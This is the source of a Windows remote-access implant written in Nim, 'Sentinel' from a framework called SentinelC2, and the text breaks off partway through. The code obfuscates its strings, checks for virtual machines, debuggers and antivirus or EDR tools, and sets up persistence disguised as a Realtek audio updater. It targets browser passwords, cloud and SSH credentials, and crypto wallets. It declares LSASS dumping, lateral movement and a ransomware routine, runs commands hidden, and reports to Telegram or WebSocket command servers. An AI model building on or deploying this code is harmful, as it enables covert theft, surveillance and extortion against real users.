# =============================================================================
# sentinel.nim
#
# SentinelC2 "Sentinel" agent - the most advanced single-file variant.
# Combines all features of:
#   - agent.nim           (WebSocket C2, full post-ex command set, exfil,
#                          recon, autodrive, keylogger, mic, clipwatch,
#                          cam, killdate, dead-man, panic wipe)
#   - agent_hardened.nim  (32-byte stream cipher obfuscation, AES-GCM meta
#                          store, anti-VM/debugger/timing/sandbox,
#                          anti-analysis checks)
#   - agent_telegram.nim  (Telegram Bot API transport, sticky-keys backdoor,
#                          periodic screenshot watcher, /cmd /ls /cat /cd
#                          shell helpers, file download by file_id, single-
#                          command selfdestruct with binary deletion)
#
# Transport selection is COMPILE-TIME via -d:c2_ws | -d:c2_tg | -d:c2_both
#   -d:c2_ws    WebSocket-only (primary C2 channel). IAT: KERNEL32+msvcrt
#               (plus user32+ws2_32+secur32+crypt32+advapi32+shell32+ole32
#               if -d:tls_pin is also set, since pinning pulls in openssl).
#   -d:c2_tg    Telegram-only (no custom server, no VPS). IAT:
#               KERNEL32+USER32+msvcrt+Ws2_32+Bcrypt+libssl+libcrypto.
#               Build script bundles the OpenSSL DLLs.
#   -d:c2_both  WebSocket primary + Telegram out-of-band notifications.
#               IAT: union of both. Largest binary.
#
# Build variants (orthogonal to transport):
#   -d:variant_silent      (default) no auto-keylog, no auto-persist, no
#                          Defender exclusion. Smallest IAT footprint.
#   -d:variant_engagement  auto-persist on first connect. For operator-
#                          directed engagements.
#   -d:variant_aggressive  auto-keylog + auto-persist + Defender exclusion.
#                          For lab / red team ranges where stealth is
#                          secondary to capability.
#
# Optional flags:
#   -d:tls_pin             When -d:c2_ws or -d:c2_both, force a custom
#                          pinned certificate (set PINNED_CERT_PEM const).
#                          This defeats corp TLS-inspection MITM.
#
# Build:
#   .\build_sentinel.ps1                 # default: c2_ws, silent
#   .\build_sentinel.ps1 -Tg             # c2_tg, silent
#   .\build_sentinel.ps1 -Both           # c2_both, silent
#   .\build_sentinel.ps1 -Tg -BotToken 123:ABC -ChatId -100123
#
# Runtime env (c2_ws):
#   SENTINEL_C2_URLS     comma-separated ws:// failover list
#   --c2=URL             CLI override (repeatable)
# Runtime env (c2_tg):
#   TELEGRAM_BOT_TOKEN   bot API token       (overrides baked-in)
#   TELEGRAM_CHAT_ID     target chat id      (overrides baked-in)
#   TELEGRAM_PROXY       http://host:port    (optional)
#   C2_POLL_INTERVAL     base poll secs      (default 3, min 1)
#   C2_POLL_TIMEOUT      long-poll secs      (default 30, min 5)
#   C2_LOG_FILE          debug log path      (default: disabled)
#   C2_NO_PERSIST        1 to skip first-run persistence
#   C2_NO_SANDBOX_CHECK  1 to skip anti-analysis
# Runtime env (c2_both):
#   Both sets above apply. Telegram is the notification channel; the
#   primary session is over WebSocket.
# =============================================================================

# =============================================================================
# Transport + variant validation
# =============================================================================
const
  c2Mode = (when defined(c2_both): "both"
            elif defined(c2_tg):  "tg"
            else:                 "ws")
  variantMode = (when defined(variant_aggressive): "aggressive"
                 elif defined(variant_engagement): "engagement"
                 else:                            "silent")

# =============================================================================
# Imports
# =============================================================================
import std/[strutils, json, os, times, random, base64,
            sequtils, tables, hashes, uri, osproc, math, options,
            locks, macros, monotimes, atomics, unicode]
import nimcrypto/sysrand
import common/[proto, streamcrypto]
import winim/lean
import winim/inc/[windef, winbase, winuser, wingdi, tlhelp32, shellapi, winhttp, wininet, winreg]

when defined(c2_ws) or defined(c2_both):
  import std/[asyncdispatch, asyncnet, nativesockets, net]
  import ws
  import nimcrypto/[pbkdf2, sha2, hmac, utils, bcmode, rijndael]
  when defined(tls_pin):
    import std/openssl

when defined(c2_tg) or defined(c2_both):
  import std/[typedthreads, streams]

# =============================================================================
# Per-build XOR key for string obfuscation
# =============================================================================
include "xorkey.nim"
static:
  doAssert XorKey.len == 32,
    "xorkey.nim must define a 32-byte XorKey for sentinel builds"

include "prefix.nim"
static:
  doAssert BuildPrefix.len == 3,
    "prefix.nim must define a 3-char BuildPrefix"
  doAssert UserAgent.len > 0,
    "prefix.nim must define a non-empty UserAgent"

include "secret.nim"
include "telegram_creds.nim"
static:
  doAssert SECRET_PLAINTEXT.len >= 16,
    "secret.nim must define SECRET_PLAINTEXT (>=16 chars)"

# =============================================================================
# Compile-time configuration
# =============================================================================
const
  AgentVersion*      = "2.0.0-sentinel"
  PollLongTimeout    = 30
  MaxOutputBytes     = 500_000

  InstallDir*        = r"C:\ProgramData\Realtek\Audio"
  InstallName*       = "RealtekAudioUpdate.exe"

  PersistRunName*    = "Realtek HD Audio Update"
  PersistTaskName*   = "RealtekAudioUpdateTask"
  PersistWmiSub*     = "RealtekAudioUpdateRuntime"

  DefaultMutex*      = "Global\\RealtekAudio" & BuildPrefix & "Runtime"

  SuspiciousProcs    = ["wireshark.exe", "fiddler.exe", "procmon.exe",
                        "processhacker.exe", "autoruns.exe",
                        "autorunsc.exe", "tcpview.exe",
                        "vmtoolsd.exe", "vboxservice.exe",
                        "vboxtray.exe", "xenservice.exe",
                        "cuckoomon.exe"]

  AvEdrProcs = ["msmpeng.exe", "mpcmdrun.exe", "nissrv.exe",
                "csfalconservice.exe", "csagent.exe",
                "cb.exe", "cbcomms.exe", "carbonblack.exe",
                "ccsvchst.exe", "smc.exe", "pccntmon.exe",
                "tmlisten.exe", "savservice.exe", "sophoshealth.exe",
                "mbam.exe", "mbamtray.exe", "mbamservice.exe"]

  StickyKeysBak      = "%SystemRoot%\\System32\\sethc.exe.bak"

  DiscordWebhookUrl  = ""
  SlackWebhookUrl    = ""

const
  C2_URLS_DEFAULT*   = @["ws://127.0.0.1:8443"]

  MIC_DEFAULT_SECS   = 10
  MIC_MAX_SECS       = 120
  MIC_SAMPLE_RATE    = 16000
  MIC_CHANNELS       = 1
  MIC_BITS           = 16
  MIC_BUF_COUNT      = 4
  MIC_BUF_MS         = 250
  MIC_LISTEN_QUEUE_MAX = 4
  MIC_LISTEN_TOTAL_SENTINEL = 1_000_000

  CLIPWATCH_DEFAULT_MS = 1500
  CLIPWATCH_MIN_MS     = 500
  CLIPWATCH_MAX_MS     = 30_000
  CLIPWATCH_MAX_TEXT_BYTES = 16_384
  CLIPWATCH_RING_CAP   = 65_536
  KEYLOG_BUFFER_MAX    = 65536

  RECONNECT_BASE_DELAY = 5.0
  RECONNECT_MAX_DELAY  = 300.0
  RECONNECT_JITTER     = 0.3
  BEACON_INTERVAL      = 10

  META_FILE_NAME      = "state.bin"
  DEFAULT_KILL_DATE   = 0'i64
  DEFAULT_SLEEP_MIN   = 0
  DEAD_MAN_SECS       = 2592000'i64  # 30 days

  AUTO_KEYLOG =
    when defined(variant_aggressive): true
    else: false
  AUTO_PERSIST =
    when defined(variant_engagement) or defined(variant_aggressive): true
    else: false
  ADD_DEFENDER_EXCLUSION =
    when defined(variant_aggressive): true
    else: false
  VARIANT_NAME* =
    when defined(variant_aggressive): "aggressive-sentinel"
    elif defined(variant_engagement): "engagement-sentinel"
    else:                            "silent-sentinel"

when defined(tls_pin):
  include "pin.nim"
else:
  const PINNED_CERT_PEM* = ""

const
  AAD_DIR_S2A = 0x00'u8
  AAD_DIR_A2S = 0x01'u8
  CHARSET     = "abcdefghijklmnopqrstuvwxyz"
  ERROR_ALREADY_EXISTS = 183

# =============================================================================
# OBFUSCATION: 32-byte stream cipher
# =============================================================================
var obfCounter {.compileTime.}: int = 0

proc encodeObf(s: string): seq[byte] =
  let ctr = obfCounter
  {.cast(raises: []).}:
    obfCounter = obfCounter + 1
  var nonce: array[4, byte]
  nonce[0] = byte((ctr shr 24) and 0xFF)
  nonce[1] = byte((ctr shr 16) and 0xFF)
  nonce[2] = byte((ctr shr 8) and 0xFF)
  nonce[3] = byte(ctr and 0xFF)
  result = @[nonce[0], nonce[1], nonce[2], nonce[3]]
  let ct = streamCipher(s.toOpenArrayByte(0, s.len - 1), XorKey, nonce)
  for b in ct: result.add(b)

proc obfDec(v: openArray[byte]): string =
  if v.len < 5: return ""
  var nonce: array[4, byte]
  for i in 0..<4: nonce[i] = v[i]
  let pt = streamCipher(v[4 ..< v.len], XorKey, nonce)
  result = newString(pt.len)
  for i in 0..<pt.len: result[i] = chr(int(pt[i]))

template obfStr(v: openArray[byte]): string = obfDec(v)

static:
  block:
    let probe = "obf-selftest-0123456789"
    doAssert obfDec(encodeObf(probe)) == probe

# =============================================================================
# Obfuscated string constants
# =============================================================================
const
  S_NTDLL         = encodeObf("ntdll.dll")
  S_KERNEL32      = encodeObf("kernel32.dll")
  S_AMSI_DLL      = encodeObf("amsi.dll")
  S_AMSI_SCAN     = encodeObf("AmsiScanBuffer")
  S_ETW_WRITE     = encodeObf("EtwEventWrite")
  S_ETW_EX        = encodeObf("EtwEventWriteEx")
  S_NTQIP         = encodeObf("NtQueryInformationProcess")

  S_AGENT_SECRET  = encodeObf(SECRET_PLAINTEXT)

  S_ONLINE_BANNER = encodeObf("sentinel online")

  S_CHROME        = encodeObf("Google\\Chrome")
  S_EDGE          = encodeObf("Microsoft\\Edge")
  S_FIREFOX       = encodeObf("Mozilla\\Firefox")
  S_DEFAULT_DIR   = encodeObf("Default")
  S_LOGIN_DATA    = encodeObf("Login Data")
  S_LOCAL_STATE   = encodeObf("Local State")

  S_LOCALAPPDATA  = encodeObf("LOCALAPPDATA")
  S_USERPROFILE   = encodeObf("USERPROFILE")
  S_APPDATA       = encodeObf("APPDATA")
  S_PROGRAMDATA   = encodeObf("PROGRAMDATA")
  S_TEMP          = encodeObf("TEMP")
  S_USERNAME      = encodeObf("USERNAME")
  S_COMPUTERNAME  = encodeObf("COMPUTERNAME")

  S_AWS           = encodeObf(".aws")
  S_AWS_CREDS     = encodeObf("credentials")
  S_GCONFIG       = encodeObf(".config")
  S_GCLOUD        = encodeObf("gcloud")
  S_AZ            = encodeObf(".azure")
  S_GIT           = encodeObf(".git-credentials")
  S_KUBE          = encodeObf(".kube")
  S_SSH_DIR       = encodeObf(".ssh")
  S_ID_RSA        = encodeObf("id_")
  S_KH            = encodeObf("known_hosts")
  S_ETHEREUM      = encodeObf("Ethereum")
  S_ETH_KEYSTORE  = encodeObf("keystore")
  S_BITCOIN       = encodeObf("Bitcoin")
  S_WALLET_DAT    = encodeObf("wallet.dat")
  S_NETSH         = encodeObf("netsh")
  S_WLAN          = encodeObf("wlan")
  S_PROFILE       = encodeObf("export profile folder=")
  S_SVC_DIR       = encodeObf("svc")
  S_PERSIST_RUN   = encodeObf("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
  S_PERSIST_RUN_W = encodeObf("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce")
  S_WINLOGON      = encodeObf("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon")
  S_SHELL_VALUE   = encodeObf("Shell")
  S_EXPLORER_EXE  = encodeObf("explorer.exe")

  S_META_DIR_NAME = encodeObf(".local")

  S_EDR_1         = encodeObf("MsMpEng.exe")
  S_EDR_2         = encodeObf("cb.exe")
  S_EDR_3         = encodeObf("cbcomms.exe")
  S_EDR_4         = encodeObf("carbonblack.exe")
  S_EDR_5         = encodeObf("csagent.exe")
  S_EDR_6         = encodeObf("csfalconservice.exe")
  S_EDR_7         = encodeObf("cylance")
  S_EDR_8         = encodeObf("ccsvchst.exe")
  S_EDR_9         = encodeObf("smc.exe")
  S_EDR_10        = encodeObf("pccntmon.exe")
  S_EDR_11        = encodeObf("tmlisten.exe")
  S_EDR_12        = encodeObf("savservice.exe")
  S_EDR_13        = encodeObf("sophoshealth.exe")
  S_EDR_14        = encodeObf("mbam.exe")
  S_EDR_15        = encodeObf("mbamtray.exe")
  S_EDR_16        = encodeObf("mbamservice.exe")
  S_EDR_17        = encodeObf("nissrv.exe")
  S_EDR_18        = encodeObf("mpcmdrun.exe")
  S_EDR_19        = encodeObf("defender")
  S_EDR_20        = encodeObf("crowdstrike")

  S_BOX_1         = encodeObf("C:\\windows\\system32\\drivers\\vboxguest.sys")
  S_BOX_2         = encodeObf("C:\\windows\\system32\\drivers\\vmhgfs.sys")
  S_BOX_3         = encodeObf("C:\\windows\\system32\\drivers\\vmscsi.sys")
  S_BOX_4         = encodeObf("C:\\windows\\system32\\drivers\\vmusbmouse.sys")
  S_BOX_5         = encodeObf("C:\\windows\\system32\\drivers\\vmxnet.sys")
  S_BOX_6         = encodeObf("C:\\windows\\system32\\drivers\\vmci.sys")
  S_BOX_7         = encodeObf("C:\\windows\\system32\\drivers\\vmmouse.sys")
  S_BOX_8         = encodeObf("C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe")
  S_BOX_9         = encodeObf("C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\VBoxTray.exe")
  S_BOX_10        = encodeObf("C:\\Program Files\\Qemu-ga\\qemu-ga.exe")
  S_BOX_11        = encodeObf("C:\\agent\\agent.exe")

  S_POWERSHELL    = encodeObf("powershell.exe")
  S_TASKKILL      = encodeObf("taskkill")
  S_SCHTASKS      = encodeObf("schtasks")
  S_REGSVR32      = encodeObf("regsvr32")

  S_WMI_ROOT_SUB  = encodeObf("ROOT\\subscription")
  S_WMI_EVENT_FILTER = encodeObf("__EventFilter")
  S_WMI_CMD_CONSUMER = encodeObf("CommandLineEventConsumer")
  S_WMI_F2C_BINDING  = encodeObf("__FilterToConsumerBinding")

  S_NETSH_VIEW    = encodeObf("net view")
  S_NETSH_SHARE   = encodeObf("net share")
  S_NETSH_SESSION = encodeObf("net session")
  S_WMIC_PRODUCT  = encodeObf("wmic product get name,version,vendor /format:list")
  S_WMIC_QFE      = encodeObf("wmic qfe list brief /format:list")
  S_REG_USBSTOR   = encodeObf("HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR")
  S_REG_MOUNTED   = encodeObf("HKLM\\SYSTEM\\MountedDevices")
  S_SCHTASKS_QRY  = encodeObf("schtasks /query /fo LIST /v")
  S_TASKLIST      = encodeObf("tasklist /v /fo csv")
  S_VAULTCMD      = encodeObf("vaultcmd /listcreds:\"Windows Credentials\" /all")

  S_WINMM         = encodeObf("winmm.dll")
  S_AVICAP32      = encodeObf("avicap32.dll")
  S_WINMM_OPEN    = encodeObf("waveInOpen")
  S_WINMM_CLOSE   = encodeObf("waveInClose")
  S_WINMM_PREPARE = encodeObf("waveInPrepareHeader")
  S_WINMM_UNPREPARE = encodeObf("waveInUnprepareHeader")
  S_WINMM_ADDBUF  = encodeObf("waveInAddBuffer")
  S_WINMM_START   = encodeObf("waveInStart")
  S_WINMM_STOP    = encodeObf("waveInStop")
  S_WINMM_RESET   = encodeObf("waveInReset")
  S_AVICAP_CREATE = encodeObf("capCreateCaptureWindowA")

# =============================================================================
when defined(windows):
  proc unhookNtdll(): bool
  proc collectEncryptRegions()
  proc ekkoSleep(ms: int)
  proc installFullPersistenceSuite(): string
  proc dumpLsassViaComsvcs(outPath: string): bool
  proc dumpSamHives(outDir: string): bool
  proc dpapiMasterKeys(): string
  proc harvestChromePasswords(): JsonNode
  proc spawnAsSystem(cmd: string): bool
  proc spawnWithSpoofedParent(cmd, parentName: string): bool
  proc wmiLateralExec(target, user, pass, cmd: string): bool
  proc runRansomware(): string
  proc resolveFromDeadDrop(): string
  proc timestomp(path, referencePath: string): bool

when defined(c2_ws) or defined(c2_both):
  proc hardeningCommandsWs(cmdName, cmdArgs: string,
                          sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.}
                         ): Future[bool] {.async.}
# PowerShell -EncodedCommand helper
# =============================================================================
proc psRun(script: string): string =
  var bytes = newSeq[byte](script.len * 2 + 2)
  var i = 0
  for r in script.runes:
    var cp = ord(r)
    if cp < 0x10000:
      bytes[i] = byte(cp and 0xFF); bytes[i+1] = byte((cp shr 8) and 0xFF)
      inc i, 2
    else:
      dec cp, 0x10000
      let hi = 0xD800 or ((cp shr 10) and 0x3FF)
      let lo = 0xDC00 or (cp and 0x3FF)
      bytes[i] = byte(hi and 0xFF); bytes[i+1] = byte((hi shr 8) and 0xFF)
      bytes[i+2] = byte(lo and 0xFF); bytes[i+3] = byte((lo shr 8) and 0xFF)
      inc i, 4
  bytes.setLen(i)
  obfStr(S_POWERSHELL) & " -NoProfile -NonInteractive -EncodedCommand " &
    base64.encode(bytes)

# =============================================================================
# Hidden, bounded command execution
# =============================================================================
const
  EXEC_MAX_OUT = 1_000_000
  EXEC_TIMEOUT_MS_DEFAULT = 120_000

type ExecArgs = object
  cmd: array[8192, char]
  done: bool
  code: int
  outLen: int
  data: array[EXEC_MAX_OUT, byte]

proc pidsWithParent(parent: int): seq[int] =
  var snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  if snap == cast[HANDLE](-1) or snap == 0: return
  var entry: PROCESSENTRY32W
  entry.dwSize = DWORD(sizeof(PROCESSENTRY32W))
  if Process32FirstW(snap, addr entry) != 0:
    while true:
      if entry.th32ParentProcessID == DWORD(parent):
        result.add(int(entry.th32ProcessID))
      if Process32NextW(snap, addr entry) == 0: break
  discard CloseHandle(snap)

when defined(windows):
  proc armAmsiHwbpCurrentThread(): bool {.gcsafe.}

proc execWorker(a: ptr ExecArgs) {.thread.} =
  when defined(windows):
    discard armAmsiHwbpCurrentThread()
  var cmd = ""
  var i = 0
  while i < a[].cmd.len and a[].cmd[i] != '\0':
    cmd.add(a[].cmd[i])
    inc i
  try:
    let r = execCmdEx(cmd,
        options = {poStdErrToStdOut, poUsePath, poDaemon})
    a[].code = r.exitCode
    let n = min(r.output.len, EXEC_MAX_OUT)
    if n > 0:
      copyMem(addr a[].data[0], unsafeAddr r.output[0], n)
    a[].outLen = n
  except CatchableError:
    a[].code = -1
    a[].outLen = 0
  a[].done = true

proc execHidden(command: string,
                timeoutMs = EXEC_TIMEOUT_MS_DEFAULT): tuple[output: string, code: int] =
  if command.len >= 8192:
    return ("[!] exec: command too long", -1)
  var a = cast[ptr ExecArgs](allocShared0(sizeof(ExecArgs)))
  for i, ch in command:
    a[].cmd[i] = ch
  let before = pidsWithParent(int(GetCurrentProcessId()))
  var t: Thread[ptr ExecArgs]
  try:
    createThread(t, execWorker, a)
  except CatchableError as e:
    deallocShared(cast[pointer](a))
    return ("[!] exec: " & e.msg, -1)

  let deadline = getMonoTime() + initDuration(milliseconds = timeoutMs)
  while not a[].done and getMonoTime() < deadline:
    sleep(50)

  if not a[].done:
    for p in pidsWithParent(int(GetCurrentProcessId())):
      if p notin before:
        discard execCmdEx("taskkill /F /T /PID " & $p,
                          options = {poStdErrToStdOut, poDaemon})
    var waited = 0
    while not a[].done and waited < 5000:
      sleep(100)
      inc waited, 100
    if not a[].done:
      # Worker still holds the buffer; leaking is safer than a UAF.
      return ("[!] exec timed out after " & $(timeoutMs div 1000) & "s", -1)

  let n = a[].outLen
  var outp = newString(n)
  if n > 0:
    copyMem(addr outp[0], addr a[].data[0], n)
  let code = a[].code
  deallocShared(cast[pointer](a))
  return (outp, code)

# =============================================================================
# Runtime configuration
# =============================================================================
proc resolveBotToken(): string =
  let env = getEnv("TELEGRAM_BOT_TOKEN", "")
  if env.len > 0: return env
  if TelegramBotToken.len > 0: return TelegramBotToken
  return ""

proc resolveChatId(): string =
  let env = getEnv("TELEGRAM_CHAT_ID", "")
  if env.len > 0: return env
  if TelegramChatId.len > 0: return TelegramChatId
  return ""

proc resolveDiscordWebhook(): string =
  let env = getEnv("DISCORD_WEBHOOK_URL", "")
  if env.len > 0: return env
  if DiscordWebhookUrl.len > 0: return DiscordWebhookUrl
  return ""

proc resolveSlackWebhook(): string =
  let env = getEnv("SLACK_WEBHOOK_URL", "")
  if env.len > 0: return env
  if SlackWebhookUrl.len > 0: return SlackWebhookUrl
  return ""

proc resolveMutex(): string =
  let env = getEnv("C2_MUTEX_NAME", "")
  if env.len > 0: return env
  if DefaultMutex.len > 0: return DefaultMutex
  return "Local\\UpdaterDefault"

proc resolveIntEnv(name: string, default, minVal: int): int =
  let v = getEnv(name, "")
  if v.len > 0:
    try:
      let n = parseInt(v)
      return max(n, minVal)
    except: discard
  return default

proc resolveC2Urls(): seq[string] {.gcsafe.} =
  var urls: seq[string] = @[]
  for i in 1..paramCount():
    let arg = paramStr(i)
    if arg.startsWith("--c2="):
      let v = arg[5..^1]
      for u in v.split(','):
        let t = u.strip()
        if t.len > 0: urls.add(t)
  if urls.len > 0: return urls
  let env = getEnv("SENTINEL_C2_URLS", "")
  if env.len > 0:
    for u in env.split(','):
      let t = u.strip()
      if t.len > 0: urls.add(t)
    if urls.len > 0: return urls
  return C2_URLS_DEFAULT

let
  BotToken        = resolveBotToken()
  ChatId          = resolveChatId()
  MutexName       = resolveMutex()
  DiscordUrl      = resolveDiscordWebhook()
  SlackUrl        = resolveSlackWebhook()
  ProxyUrl        = block:
    var p = getEnv("TELEGRAM_PROXY", "")
    if p.len == 0: p = getEnv("HTTPS_PROXY", "")
    if p.len == 0: p = getEnv("HTTP_PROXY", "")
    if p.len == 0: p = getEnv("https_proxy", "")
    if p.len == 0: p = getEnv("http_proxy", "")
    p
  PollBaseMs      = resolveIntEnv("C2_POLL_INTERVAL", 3000, 1000)
  PollHttpSec     = resolveIntEnv("C2_POLL_TIMEOUT", PollLongTimeout, 5)
  LogFilePath     = getEnv("C2_LOG_FILE", "")
  NoPersist       = getEnv("C2_NO_PERSIST", "0") == "1"
  NoSandbox       = getEnv("C2_NO_SANDBOX_CHECK", "0") == "1"
  C2_URLS_RESOLVED* = resolveC2Urls()

# =============================================================================
# Logging (encrypted at rest)
# =============================================================================
var gLogNonce: uint32 = 0
proc getAgentLogPath(): string =
  getEnv("TEMP", expandTilde("~")) / ("csp-" & BuildPrefix & ".dat")

proc agentLog(msg: string) {.gcsafe.} =
  {.cast(gcsafe).}:
    try:
      let logPath = getAgentLogPath()
      try: createDir(logPath.parentDir) except: discard
      let f = open(logPath, fmAppend)
      defer: f.close()
      let line = "[" & now().format("yyyy-MM-dd HH:mm:ss") & "] " & msg
      # Each line has its own counter -> unique keystream per line.
      let blob = encryptLogLine(line, XorKey, gLogNonce)
      inc gLogNonce
      f.write(blob)
    except: discard

agentLog("v=" & AgentVersion & " variant=" & VARIANT_NAME &
         " transport=" & c2Mode &
         " c2=" & (if c2Mode == "tg" or c2Mode == "both":
                     "tg:" & ChatId
                   else: C2_URLS_RESOLVED.join(",")))

proc winHttpProxyInfo(): tuple[accessType: DWORD, proxyName: string] =
  if ProxyUrl.len == 0:
    return (WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, "")
  var p = ProxyUrl
  if p.startsWith("http://"): p = p[7..^1]
  elif p.startsWith("https://"): p = p[8..^1]
  p = p.strip(chars = {'/'})
  if p.len == 0: return (WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, "")
  return (WINHTTP_ACCESS_TYPE_NAMED_PROXY, p)

proc logMsg(msg: string) =
  if LogFilePath.len == 0: return
  try:
    let dir = LogFilePath.parentDir()
    if dir.len > 0: createDir(dir)
    let f = open(LogFilePath, fmAppend)
    defer: f.close()
    f.writeLine("[" & now().format("yyyy-MM-dd HH:mm:ss") & "] " & msg)
  except: discard

# =============================================================================
# CRYPTO - WS path
# =============================================================================
when defined(c2_ws) or defined(c2_both):
  type
    SessionCrypto = ref object
      key: array[32, byte]
      sendCtr: uint32
      recvCtr: uint32
      agentId: string
      peerNonce: array[16, byte]

  proc encryptFrame(sc: SessionCrypto, plain: string): seq[byte] =
    var randBytes: array[8, byte]
    discard randomBytes(addr randBytes[0], 8)
    let nonce = makeNonce(sc.sendCtr, randBytes)
    inc sc.sendCtr
    let aad = makeAad(sc.agentId, AAD_DIR_A2S)
    result = newSeqOfCap[byte](12 + plain.len + 16)
    for b in nonce: result.add(b)
    for b in gcmSeal(sc.key, nonce, aad, plain): result.add(b)

  proc decryptFrame(sc: SessionCrypto, blob: openArray[byte]): string =
    if blob.len < 28: return ""
    var nonce: array[12, byte]
    for i in 0..<12: nonce[i] = blob[i]
    gcmOpen(sc.key, nonce, makeAad(sc.agentId, AAD_DIR_S2A), blob[12 ..< blob.len])

# =============================================================================
# UTILITIES
# =============================================================================
proc randomToken(n: int = 4): string =
  var rb: array[32, byte]
  discard randomBytes(addr rb[0], n)
  for i in 0..<n: result.add(toHex(rb[i], 2))

proc hexToBytes(s: string): seq[byte] =
  if s.len == 0 or (s.len mod 2) != 0: return @[]
  result = newSeq[byte](s.len div 2)
  for i in 0..<result.len:
    result[i] = byte(parseHexInt(s[i*2 .. i*2+1]))

proc isAdmin(): bool =
  var tok: HANDLE
  if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, addr tok) == 0:
    return false
  defer: CloseHandle(tok)
  var elev: DWORD
  var retLen: DWORD
  if GetTokenInformation(tok, cast[TOKEN_INFORMATION_CLASS](20),
                        cast[LPVOID](addr elev), DWORD(sizeof(elev)), addr retLen) == 0:
    return false
  result = elev != 0

proc getSystemInfo(): JsonNode =
  let hostname = getEnv("COMPUTERNAME", "?")
  let os = "Windows " & getEnv("OS", "")
  let user = getEnv("USERNAME", "unknown")
  let priv = (if isAdmin(): "admin" else: "user")
  result = newJObject()
  result["h"] = %hostname
  result["o"] = %os
  result["u"] = %user
  result["p"] = %priv
  result["i"] = %int(getCurrentProcessId())
  result["v"] = %VARIANT_NAME
  result["t"] = %c2Mode

when defined(c2_ws) or defined(c2_both):
  proc panicWipe()
  proc sendToTg(text: string): bool
  proc sendToHook(text: string): bool

# =============================================================================
# META STORE (AES-256-GCM)
# =============================================================================
type
  MetaData = object
    regName: string
    taskName: string
    wmiSubName: string
    copyPath: string
    installKey: array[32, byte]
    killDate: int64
    sleepMin: int
    lastContact: int64

let META_DIR = getEnv(obfStr(S_LOCALAPPDATA), expandTilde("~")) / obfStr(S_META_DIR_NAME)
let META_FILE = META_DIR / META_FILE_NAME

const META_PBKDF2_ITER = 100_000
const META_AAD = "META-V1"

var gReplMode: bool = false

var agentSecretCache: string = ""
var agentSecretLock: Lock
initLock(agentSecretLock)

when defined(c2_ws) or defined(c2_both):
  proc agentSecret(): string =
    withLock agentSecretLock:
      if agentSecretCache.len > 0: return agentSecretCache
      {.cast(gcsafe).}:
        agentSecretCache = obfStr(S_AGENT_SECRET)
      return agentSecretCache

  proc deriveMetaKey(installKey: openArray[byte]): array[32, byte] =
    let secret = agentSecret()
    var ctx: HMAC[sha256]
    ctx.init(secret.toOpenArrayByte(0, secret.high))
    discard ctx.pbkdf2(installKey,
                       META_AAD.toOpenArrayByte(0, META_AAD.high),
                       META_PBKDF2_ITER, result)
    ctx.clear()

  proc metaEncrypt(plaintext: openArray[byte], installKey: openArray[byte]): seq[byte] =
    let key = deriveMetaKey(installKey)
    var nonce: array[12, byte]
    discard randomBytes(addr nonce[0], 12)
    var ctx: GCM[aes256]
    ctx.init(key, nonce, META_AAD.toOpenArrayByte(0, META_AAD.high))
    var ct = newSeq[byte](plaintext.len)
    ctx.encrypt(plaintext, ct)
    let tag = ctx.getTag()
    result = newSeqOfCap[byte](12 + 16 + ct.len)
    for b in nonce: result.add(b)
    for b in tag: result.add(b)
    for b in ct: result.add(b)

  proc metaDecrypt(blob: openArray[byte], installKey: openArray[byte]): seq[byte] =
    if blob.len < 28: return @[]
    var nonce: array[12, byte]
    for i in 0..<12: nonce[i] = blob[i]
    var tag: array[16, byte]
    for i in 0..<16: tag[i] = blob[12 + i]
    let ct = blob[28 ..< blob.len]
    let key = deriveMetaKey(installKey)
    var ctx: GCM[aes256]
    ctx.init(key, nonce, META_AAD.toOpenArrayByte(0, META_AAD.high))
    var pt = newSeq[byte](ct.len)
    if not ctx.decrypt(ct, pt, tag): return @[]
    return pt

  proc loadMeta(): MetaData =
    result = MetaData(killDate: DEFAULT_KILL_DATE, sleepMin: DEFAULT_SLEEP_MIN)
    try:
      if not fileExists(META_FILE): return
      let raw = readFile(META_FILE)
      let rawBytes = cast[seq[byte]](raw)
      if rawBytes.len < 60: return
      for i in 0..<32: result.installKey[i] = rawBytes[i]
      let body = metaDecrypt(rawBytes[32 ..< rawBytes.len], result.installKey)
      if body.len == 0: return
      let j = parseJson(cast[string](body))
      if j.hasKey("reg"):   result.regName  = j["reg"].getStr
      if j.hasKey("task"):  result.taskName = j["task"].getStr
      if j.hasKey("wmi"):   result.wmiSubName = j["wmi"].getStr
      if j.hasKey("copy"):  result.copyPath = j["copy"].getStr
      if j.hasKey("kill"):  result.killDate = j["kill"].getInt
      if j.hasKey("sleep"): result.sleepMin = j["sleep"].getInt
      if j.hasKey("lc"):    result.lastContact = j["lc"].getInt
    except: discard

  proc saveMeta(meta: MetaData) =
    try:
      createDir(META_DIR)
      let body = $ %* {
        "reg":   meta.regName,
        "task":  meta.taskName,
        "wmi":   meta.wmiSubName,
        "copy":  meta.copyPath,
        "kill":  meta.killDate,
        "sleep": meta.sleepMin,
        "lc":    meta.lastContact
      }
      let bodyBytes = cast[seq[byte]](body)
      let bodyEnc = metaEncrypt(bodyBytes, meta.installKey)
      var outp = newSeqOfCap[byte](32 + bodyEnc.len)
      for b in meta.installKey: outp.add(b)
      for b in bodyEnc: outp.add(b)
      writeFile(META_FILE, cast[string](outp))
    except: discard

when defined(c2_tg):
  const TG_DEAD_MAN_SECS = 30 * 24 * 3600
  var tgMetaInstallKey: array[32, byte]
  var tgMetaLastContact: int64 = 0
  var tgMetaKillDate: int64 = 0
  var tgMetaSleepMin: int = 0
  var tgSleepEpoch: int64 = 0
  let TG_META_FILE = META_DIR / META_FILE_NAME

  proc loadTgMeta() =
    try:
      if not fileExists(TG_META_FILE): return
      let raw = readFile(TG_META_FILE)
      if raw.len < 32: return
      let rawBytes = cast[seq[byte]](raw)
      for i in 0..<32: tgMetaInstallKey[i] = rawBytes[i]
      if raw.len >= 40:
        var lc: int64 = 0
        for i in 0..<8: lc = lc or (int64(rawBytes[32+i]) shl (i*8))
        tgMetaLastContact = lc
      if raw.len >= 48:
        var kd: int64 = 0
